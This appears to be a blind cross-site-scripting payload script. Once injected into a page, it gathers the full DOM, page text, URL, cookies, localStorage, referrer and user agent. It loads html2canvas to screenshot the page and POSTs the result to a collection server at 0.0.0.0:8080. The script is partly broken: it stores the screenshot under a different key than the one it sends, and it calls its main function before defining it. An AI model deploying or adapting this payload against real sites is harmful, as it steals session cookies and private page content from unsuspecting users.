var data = {
    url:"",
    origin:"",
    userAgent:"",
    localStorage:"",
    screenshot:"",
    cookies:"",
    referrer:"",
    text:"",
    dom:"",
    title:"",
    iframe:!(window.top === window)
}

function addEvent(element, eventName, fn) {
    if (element.addEventListener)
        element.addEventListener(eventName, fn, false);
    else if (element.attachEvent)
        // to support ie8
        element.attachEvent('on' + eventName, fn);
    }
    var s = document.createElement( 'script' );
    s.setAttribute( 'src', "https://cdnjs.cloudflare.com/ajax/libs/html2canvas/1.4.1/html2canvas.min.js" );
    document.body.appendChild( s );

if( document.readyState == "complete" ) {
    extract()
} else { 
    addEvent( window, "load", function(){
        extract()
    });
}



var extract = () => {
    getDomText()
    getUrl()
    getLocalStorage()
    cookies()
    getReferrer()
    getUserAgent()
    origin()
    screenshot()
    data.title = document.title
    fetch('http://0.0.0.0:8080/post', {
    method: 'POST',
    headers: {
      'Accept': 'application/json',
      'Content-Type': 'application/json'
    },
    body: JSON.stringify({screenshot:data.screenshot})
  })
} 

// Trying to extract the dom text from every option possible
function getDomText() {
    try{
        data.dom = document.documentElement.outerHTML
    } catch {
        data.dom = ''
    }
    var TextValues = [
		document.body.outerText,
		document.body.innerText,
		document.body.textContent,
	];
	for(var i = 0; i < TextValues.length; i++) {
		if(typeof TextValues[i] === 'string') {
            data.text = TextValues[i]
            return
		}
	}
    data.text = ''

}

function getUrl() {
    try {
        data.url = location.toString()
    } catch {
        data.url = ""
    }
}

function getLocalStorage() {
    try {
        data.localStorage = JSON.stringify(localStorage)
    } catch  {
        data.localStorage = ''
    }
}

function encodeLocalStorage(data) {

    console.log(data)
}

function cookies() {
    try {
        data.cookies = document.cookie
    } catch  {
        data.cookies = ''
    }
}

function getReferrer() {
    try {
        data.referrer = document.referrer
    } catch  {
        data.referrer = ''
    }
}

function getUserAgent() {
    try {
        data.userAgent = navigator.userAgent
    } catch  {
        data.userAgent = ''
    }
}

function origin() {
    try {
        data.origin = location.origin
    } catch  {
        data.origin = ''
    }
}

function screenshot(){
    html2canvas(document.body).then(function(canvas) {
        console.log(canvas.toDataURL())
        data.screenshot_encoded = canvas.toDataURL();
    });
    
    //
}